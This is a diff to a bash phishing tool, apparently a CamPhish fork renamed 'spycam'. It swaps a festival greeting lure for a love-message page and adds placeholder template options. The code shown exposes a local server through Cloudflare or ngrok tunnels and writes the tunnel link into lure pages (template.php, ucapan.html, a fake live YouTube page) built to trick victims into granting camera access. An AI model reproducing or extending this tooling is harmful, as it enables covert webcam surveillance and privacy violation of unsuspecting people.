@@ -256,8 +256,7 @@ payload_cloudflare() {
   link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
   sed 's+forwarding_link+'$link'+g' template.php >index.php
   if [[ $option_tem -eq 1 ]]; then
-    sed 's+forwarding_link+'$link'+g' festivalwishes.html >index3.html
-    sed 's+fes_name+'$fest_name'+g' index3.html >index2.html
+    sed 's+forwarding_link+'$link'+g' ucapan.html >index2.html
   elif [[ $option_tem -eq 2 ]]; then
     sed 's+forwarding_link+'$link'+g' LiveYTTV.html >index3.html
     sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html >index2.html
@@ -431,8 +430,7 @@ payload_ngrok() {
   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
   sed 's+forwarding_link+'$link'+g' template.php >index.php
   if [[ $option_tem -eq 1 ]]; then
-    sed 's+forwarding_link+'$link'+g' festivalwishes.html >index3.html
-    sed 's+fes_name+'$fest_name'+g' index3.html >index2.html
+    sed 's+forwarding_link+'$link'+g' ucapan.html >index2.html
   elif [[ $option_tem -eq 2 ]]; then
     sed 's+forwarding_link+'$link'+g' LiveYTTV.html >index3.html
     sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html >index2.html
@@ -456,7 +454,7 @@ payload_ngrok() {
   rm -rf index3.html
 }
 
-camphish() {
+spycam() {
   if [[ -e sendlink ]]; then
     rm -rf sendlink
   fi
@@ -477,7 +475,7 @@ camphish() {
     printf "\e[1;93m [!] Invalid option!\e[0m\n"
     sleep 1
     clear
-    camphish
+    spycam
   fi
 }
 
@@ -487,10 +485,10 @@ select_template() {
     sleep 1
     clear
     banner
-    camphish
+    spycam
   else
     printf "\n-----Choose a template----\n"
-    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ucapan cinta nih... kiw kiw\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
@@ -503,11 +501,22 @@ select_template() {
     read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
     option_tem="${option_tem:-${default_option_template}}"
     if [[ $option_tem -eq 1 ]]; then
-      read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-      fest_name="${fest_name//[[:space:]]/}"
+      printf ""
     elif [[ $option_tem -eq 2 ]]; then
       read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
     elif [[ $option_tem -eq 3 ]]; then
+      printf ""
+    elif [[ $option_tem -eq 4 ]]; then
+      printf ""
+    elif [[ $option_tem -eq 5 ]]; then
+      printf ""
+    elif [[ $option_tem -eq 6 ]]; then
+      printf ""
+    elif [[ $option_tem -eq 7 ]]; then
+      printf ""
+    elif [[ $option_tem -eq 8 ]]; then
+      printf ""
+    elif [[ $option_tem -eq 9 ]]; then
       printf ""
     else
       printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
@@ -519,4 +528,4 @@ select_template() {
 
 banner
 dependencies
-camphish
+spycam
